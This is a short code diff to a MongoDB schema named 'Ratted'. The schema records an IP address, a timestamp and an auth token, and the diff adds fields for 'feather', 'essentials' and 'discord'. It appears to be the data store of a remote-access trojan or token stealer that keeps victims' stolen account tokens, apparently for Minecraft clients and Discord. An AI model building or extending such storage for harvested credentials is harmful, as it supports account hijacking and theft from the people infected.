@@ -7,6 +7,9 @@ const rattedSchema = mongoose.Schema({
     ip: String,
     timestamp: Date,
     tokenAuth: String,
+    feather: String,
+    essentials: String,
+    discord: String
 })
 
 module.exports = mongoose.model("Ratted", rattedSchema)
